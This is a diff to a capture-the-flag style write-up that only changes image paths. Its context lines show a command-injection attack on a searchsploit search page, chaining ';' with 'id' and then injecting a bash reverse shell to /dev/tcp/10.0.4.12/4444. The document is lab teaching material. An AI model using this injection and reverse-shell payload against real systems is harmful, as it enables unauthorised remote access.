@@ -71,13 +71,13 @@ We only have port `80` open.
 
 We access the service over `HTTP` and find a page that allows us to search for exploits by entering a keyword.
 
-![](../../.gitbook/assets/hck.png)
+![](../../images/hck.png)
 
 It looks likely that when we submit a word the server runs the command `searchsploit <input>`.
 
 The first thing that occurred to me when I saw this was to use a semicolon to chain and execute other commands such as `whoami`. We try `hola; id`:
 
-![](../../.gitbook/assets/id.png)
+![](../../images/id.png)
 
 At the very bottom we see the output of the id command.
 
@@ -89,7 +89,7 @@ We are executing commands as the user hacker.
 
 We will abuse this vulnerability to inject a command that returns a `reverse shell`. To make manipulation easier we intercept the request with `Burp Suite`.
 
-![](../../.gitbook/assets/request.png)
+![](../../images/request.png)
 
 Now we inject, instead of the `id` command, the command that spawns the `reverse shell` (the command is as follows):
 
@@ -99,7 +99,7 @@ bash -c 'bash -i >& /dev/tcp/10.0.4.12/4444 0>&1'
 
 Once we have it, we press `Ctrl + U` to apply `URL encoding`, resulting in the encoded payload.
 
-![](../../.gitbook/assets/request2.png)
+![](../../images/request2.png)
 
 Before forwarding the request we set up a `listener` on our attacker machine.
 
